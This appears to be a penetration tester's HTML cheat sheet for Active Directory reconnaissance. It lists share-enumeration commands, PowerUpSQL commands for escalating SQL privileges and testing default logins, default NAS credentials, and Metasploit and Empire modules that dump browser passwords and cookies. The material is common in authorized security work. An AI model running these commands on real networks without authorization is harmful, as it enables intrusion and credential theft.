<h1 align='center'>Active Directory</h1>
<ol>
  <li><a href='#recon'>Recon</a></li>
</ol>

<h2 align='center' id='recon'>Recon</h2>
<ol>
  <h3><li>SPN scanning</li></h3>
    <p>This <a href='https://github.com/gold1029/PowerShell-AD-Recon/blob/master/Discover-PSMSSQLServers'>script</a> can help</p>
    <p>Interestings services:</p>
      <ul>
        <li>SQL (MSSQLSvc/adsmsSQLAP01.ads.org:1433)</li>
        <li>Exchange (exchangeMDB/adsmsEXCAS01.ads.org)</li>
        <li>RDP (TERMSERV/adsmsEXCAS01.adsecurity.org)</li>
        <li>WSMan / WinRM / PS Remoting (WSMAN/adsmsEXCAS01.ads.org)</li>
        <li>Hyper-V (Microsoft Visual Console Service/adsmsHV01.ady.org)</li>
        <li>VMWare VCenter (STS/adsmsVC01.ads.org)</li>
      </ul>
  <h3><li>General Resources</li></h3>
    <ul>
      <li><code>> net share</code></li>
      <li><code>> net view</code></li>
      <li><code>> net view COMPUTER_NAME /all</code></li>
      <li><code>> wmic share get</code></li>
      <li><code>> wmic /node: COMPUTER_NAME share get</code></li>
    </ul>
    <p>Useful tool for searching - <a href='https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1'>PowerView</a>
  <h3><li>Data Bases</li></h3>
    <p>Useful tool - <a href='https://github.com/NetSPI/PowerUpSQL'>PowerUpSQL</a></p>
    <ul>
      <li>Find all local SQL instances: 
        <pre><code>Get-SQLInstanceLocal -Verbose</code></pre></li>
      <li>Find all local SQL instances in the domain or network:</li>
        <pre><code>Get-SQLInstanceDomain -Verbose</code></pre>
        <pre><code>Get-SQLInstanceBroadcast -Verbose</code></pre>
        <pre><code>Get-SQLInstanceScanUDP -Verbose</code></pre>
      <li>Collect info about instances:</li>
        <pre><code>Get-SQLInstanceLocal | Get-SQLServerInfo</code></pre>
      <li>Get a list of SQL instances to which the current user has access:</li>
        <pre><code>Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10</code></pre>
      <li>Try go get admin access:</li>
        <pre><code>Invoke-SQLEscalatePriv -Verbose -Instance "COMPUTER_NAME"</code></pre>
      <li>Enumerate SQL instances across the domain using default passwords:</li>
        <pre><code>Get-SQLInstanceDomain -Verbose | Get-SQLServerLoginDefault</code></pre>
      <li>Dump info about SQL server and db:
        <pre><code>Invoke-SQLDumpInfo -Verbose -Instance "COMPUTER_NAME"</code></pre>
      <li>Run audit function for SQL server:
        <pre><code>Invoke-SQLAudit -Verbose -Instance "COMPUTER_NAME"</code></pre>
    </ul>
<h3><li>Network Attached Storage</li></h3>
  <p>Default creds:</p>
    <ul>
      <li><code>admin:admin</code></li>
      <li><code>admin:password</code></li>
      <li><code>root:nasadmin</code></li>
      <li><code>nasadmin:nasadmin</code></li>
      <li><code>admin:"no pass"</code></li>
    </ul>
<h3><li>Users` data with priviligies</li></h3>
    <ul>
      <li>Useful tool - <a href='https://github.com/BloodHoundAD/BloodHound'>BloodHound</a></li>
      <li>PowerView and PowerShell Empire module:</li>
        <pre><code>Find-DomainUserLocation -UserIdentity USER_NAME</code></pre>
        <pre><code>Find-DomainUserLocation -UserGroupIdentity GROUP_NAME</code></pre>
      <li>Local Data:</li>
        <p>Metasploit modules for check browser passwords:</p>
          <ul>
            <li><code>post/windows/gather/enum_chrome</code></li>
            <li><code>post/multi/gather/firefox/creds</code></li>
            <li><code>post/firefox/gather/cookies</code></li>
            <li><code>post/firefox/gather/passwords</code></li>
            <li><code>post/windows/gather/forensics/browser_history</code></li>
          </ul>
        <p>PowerShell Empire modules:
          <ul>
            <li><code>collcetion/ChromeDump</code></li>
            <li><code>collection/FoxDump</code></li>
          </ul>
    </ul>
</ol>
